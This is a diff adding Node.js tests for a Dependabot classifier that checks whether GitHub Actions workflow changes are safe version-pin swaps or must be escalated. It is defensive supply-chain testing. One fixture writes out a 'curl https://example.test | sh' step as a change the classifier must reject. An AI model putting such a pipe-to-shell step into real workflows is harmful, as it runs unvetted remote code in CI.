@@ -3,7 +3,12 @@
 // classes Classify and Content), one for one, so the two lanes sort a pull
 // request the same way; the content-step and security cases are this lane's.
 import assert from "node:assert/strict";
+import { spawnSync } from "node:child_process";
+import { writeFileSync } from "node:fs";
+import { join } from "node:path";
 import { test } from "node:test";
+
+import { tempDir } from "../../../lib/test-tmp.mjs";
 
 import {
   classifierGaps,
@@ -17,12 +22,20 @@ import {
   isSemverRange,
   isSecurityUpdate,
   parseConfig,
+  pinSwapRefusal,
+  policyPath,
   provenanceReasons,
   pushRefusal,
   reviewOnly,
   usesOnly,
   withProvenance,
 } from "./dependency-classify.mjs";
+
+test("policyPath takes the standards checkout STANDARDS_DIR names, else the fallback", () => {
+  assert.equal(policyPath({ STANDARDS_DIR: "/s" }, "/fallback"), "/s/components/dependabot-policy/policy.json");
+  assert.equal(policyPath({}, "/fallback"), "/fallback");
+  assert.equal(policyPath({ STANDARDS_DIR: "" }, "/fallback"), "/fallback");
+});
 
 const NPM = "dependabot/npm_and_yarn/x-1.3.0";
 const ACTIONS = "dependabot/github_actions/actions/checkout-4.2.0";
@@ -1008,5 +1021,72 @@ test("every commit arrives in its own author's push", () => {
     const history = vector.pushes.map(([activity_type, who, before, after]) => ({ activity_type, before, after, actor: PUSHERS[who] }));
     assert.equal(pushRefusal(history, vector.head ?? history[0].after, vector.commits.map(vectorCommit), APP_ID), vector.want, vector.why);
   }
+});
+
+const SHA_A = "a".repeat(40);
+const SHA_B = "b".repeat(40);
+const ciYaml = (uses, run = "make check", extra = []) =>
+  ["on: push", "jobs:", "  ci:", "    runs-on: ubuntu-latest", "    steps:", ...uses.map((u) => `      - uses: ${u}`), `      - run: ${run}`, ...extra, ""].join("\n");
+
+function gitPatch(before, after) {
+  const dir = tempDir("pin-swap-");
+  writeFileSync(join(dir, "before.yml"), before);
+  writeFileSync(join(dir, "after.yml"), after);
+  const env = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
+  const diff = spawnSync("git", ["diff", "--no-index", "--no-color", "before.yml", "after.yml"], { cwd: dir, env, encoding: "utf8" });
+  assert.equal(diff.status, 1, diff.stderr);
+  const patch = diff.stdout.slice(diff.stdout.indexOf("@@")).replace(/\n$/, "");
+  return [{ filename: ".github/workflows/ci.yml", status: "modified", patch }];
+}
+
+const workflow = (...pairs) => gitPatch(ciYaml(pairs.map(([from]) => from)), ciYaml(pairs.map(([, to]) => to)));
+
+test("an official vendor's action moving from one version tag to another is a pin swap", () => {
+  for (const [from, to] of [
+    ["actions/checkout@v7", "actions/checkout@v8"],
+    ["github/codeql-action/init@v3.1", "github/codeql-action/init@v3.2"],
+    ["dependabot/fetch-metadata@v2.3.0", "dependabot/fetch-metadata@v2.4.0 # v2.4.0"],
+    ["microsoft/setup-msbuild@v2", "microsoft/setup-msbuild@v3"],
+    ["Azure/login@v2", "Azure/login@v3"],
+    ["azure/login@v2", "azure/login@v3"],
+    ["anthropics/claude-code-action@v1", "anthropics/claude-code-action@v2"],
+    ["openai/codex-action@v1", "openai/codex-action@v1.1"],
+  ]) {
+    assert.equal(pinSwapRefusal(workflow([from, to])), null, `${from} -> ${to}`);
+  }
+  assert.equal(pinSwapRefusal(workflow([`actions/checkout@${SHA_A} # v7.0.0`, `actions/checkout@${SHA_B} # v7.0.1`])), null);
+});
+
+test("a vendor tag moved to a branch or other ref, or a vendor ref changing kind, escalates", () => {
+  for (const [from, to] of [
+    ["actions/checkout@v7", "actions/checkout@main"],
+    ["actions/checkout@v7", "actions/checkout@v8-beta"],
+    ["actions/checkout@v7", "actions/checkout@releases/v8"],
+    ["actions/checkout@v7", `actions/checkout@${SHA_B}`],
+    [`actions/checkout@${SHA_A}`, "actions/checkout@v8"],
+    ["actions/checkout@v7", "actions/setup-node@v8"],
+  ]) {
+    assert.match(pinSwapRefusal(workflow([from, to])) ?? "", /^\.github\/workflows\/ci\.yml:/, `${from} -> ${to}`);
+  }
+});
+
+test("a third-party or first-party action off a full SHA escalates", () => {
+  for (const [from, to] of [
+    [`evilcorp/setup-tool@${SHA_A}`, "evilcorp/setup-tool@v2"],
+    ["evilcorp/setup-tool@v1", "evilcorp/setup-tool@v2"],
+    ["melodic-software/ci-workflows/.github/actions/x@v1", "melodic-software/ci-workflows/.github/actions/x@v2"],
+    ["actions-evil/checkout@v7", "actions-evil/checkout@v8"],
+  ]) {
+    assert.equal(pinSwapRefusal(workflow([from, to])), ".github/workflows/ci.yml:not-a-full-sha-or-vendor-tag", `${from} -> ${to}`);
+  }
+});
+
+test("a vendor tag bump beside any other change escalates", () => {
+  const vendor = ["actions/checkout@v7", "actions/checkout@v8"];
+  assert.equal(pinSwapRefusal(workflow(vendor, [`evilcorp/setup-tool@${SHA_A}`, "evilcorp/setup-tool@v2"])), ".github/workflows/ci.yml:not-a-full-sha-or-vendor-tag");
+  const [from, to] = vendor;
+  assert.equal(pinSwapRefusal(gitPatch(ciYaml([from]), ciYaml([to], "make check", ["      - run: curl https://example.test | sh"]))), ".github/workflows/ci.yml:lines-added-or-removed");
+  assert.equal(pinSwapRefusal(gitPatch(ciYaml([from]), ciYaml([to], "make deploy"))), ".github/workflows/ci.yml:not-a-uses-line");
+  assert.equal(pinSwapRefusal(workflow(vendor, [`actions/setup-node@${SHA_A}`, `actions/setup-node@${SHA_B}`])), null);
 });
 
